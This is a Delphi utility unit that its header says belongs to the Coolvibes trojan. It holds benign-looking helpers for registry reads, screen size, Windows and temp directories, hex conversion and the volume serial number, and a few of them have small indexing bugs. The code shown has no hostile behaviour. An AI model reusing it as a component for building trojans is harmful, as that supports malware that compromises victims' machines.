{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en varias partes del programa}
unit UnitFunciones;

interface

uses
  Windows,
  SHfolder,
  SysUtils;

function GetClave(key: Hkey; subkey, nombre: string): string;
function AnchuraPantalla(): integer;
function AlturaPantalla(): integer;
function HexToInt(s: string): longword;
{  function FileTime2DateTime(FileTime: TFileTime): TDateTime;
En un fúturo es posible que se use esta función para mostrar la fecha de modificación de una clave}
function FindWindowsDir: string;
function FindSystemDir: string;
function FindTempDir: string;
function FindRootDir: string;
function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
function WinDir: string;
function SysDir: string;
function Replace(Dest, SubStr, Str: string): string;
function GetSpecialFolderPath(folder : integer) : string;//AppDir
function GetHardDiskSerial : string;
implementation


function GetHardDiskSerial : string;
var
  NotUsed:     DWORD;
  VolumeFlags: DWORD;
  VolumeSerialNumber: DWORD;
  Drive : Array[0..MAX_PATH] of Char;
begin
  VolumeSerialNumber := 0;
  ZeroMemory(@Drive, SizeOf(Drive));
  GetWindowsDirectory(Drive, SizeOf(Drive));
  Drive[3] := #0; //Para que la funcion GetVolumeInformation considere únicamente los primeros 3 carácteres, ejemplo: c:\
  GetVolumeInformation(Drive, nil, 0, @VolumeSerialNumber, NotUsed, VolumeFlags, nil, 0);
  Result := IntToHex(VolumeSerialNumber, 8);
end;

function GetClave(key: Hkey; subkey, nombre: string): string;
var
  bytesread: dword;
  regKey:    HKEY;
  valor:     string;
begin
  Result := '';
  RegOpenKeyEx(key, PChar(subkey), 0, KEY_READ, regKey);
  RegQueryValueEx(regKey, PChar(nombre), nil, nil, nil, @bytesread);
  SetLength(valor, bytesread);
  if RegQueryValueEx(regKey, PChar(nombre), nil, nil, @valor[1], @bytesread) = 0 then
    Result := valor;
  RegCloseKey(regKey);
end;

function AlturaPantalla(): integer;
var
  Rectangulo: TRECT;
begin
  GetWindowRect(GetDesktopWindow(),
    Rectangulo);
  Result := Rectangulo.Bottom - Rectangulo.Top;
end;

function AnchuraPantalla(): integer;
var
  Rectangulo: TRECT;
begin
  GetWindowRect(GetDesktopWindow(),
    Rectangulo);
  Result := Rectangulo.Right - Rectangulo.Left;
end;

function HexToInt(s: string): longword;
var
  b: byte;
  c: char;
begin
  Result := 0;
  s      := UpperCase(s);
  for b := 1 to Length(s) do
  begin
    Result := Result * 16;
    c      := s[b];
    case c of
      '0'..'9': Inc(Result, Ord(c) - Ord('0'));
      'A'..'F': Inc(Result, Ord(c) - Ord('A') + 10);
      else
        raise EConvertError.Create('No Hex-Number');
    end;
  end;
end;

function FindWindowsDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindSystemDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindTempDir: string;
  //retorna el directorio de los temporales
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindRootDir: string;
  //retorna el root del directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    Result := Copy(Result, 1, 3);
end;


function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
  //Devuelve la string especificada para true si el boolean que se le pasa es true, y viceversa
begin
  if Bool then
    Result := TrueString
  else
    Result := FalseString;
end;

{function FileTime2DateTime(FileTime: TFileTime): TDateTime;
var
  LocalFileTime: TFileTime;
  SystemTime: TSystemTime;
begin
  FileTimeToLocalFileTime(FileTime, LocalFileTime);
  FileTimeToSystemTime(LocalFileTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;}

function WinDir: string;
var
  intLen:    integer;
  strBuffer: string;
begin
  SetLength(strBuffer, 1000);
  intLen := GetWindowsDirectory(PChar(strBuffer), 1000);
  Result := (Copy(strBuffer, 1, intLen));
  if Result[Length(Result) - 1] <> '\' then
    Result := Result + '\';
end;


function SysDir: string;
var
  intLen:    integer;
  strBuffer: string;
begin
  SetLength(strBuffer, 1000);
  intLen := GetSystemDirectory(PChar(strBuffer), 1000);
  Result := (Copy(strBuffer, 1, intLen));
  if Result[Length(Result) - 1] <> '\' then
    Result := Result + '\';
end;

//if you have Dest is '1234567890' and SubStr is '345' and Str is 'ABCDE', then you will receive Dest as '12ABCDE67890'
function Replace(Dest, SubStr, Str: string): string;
var
  Position: integer;
begin
  Position := Pos(SubStr, Dest);
  while (Position <> 0) do
  begin
    Delete(Dest, Position, Length(SubStr));
    Insert(Str, Dest, Position);
    Position := Pos(SubStr, Dest);
  end;
  Result := Dest;
end;

function GetSpecialFolderPath(folder : integer) : string;  //consigue el directorio de las aplicaciones
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array [0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
    Result := path
  else
    Result := '';
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
end;
end.
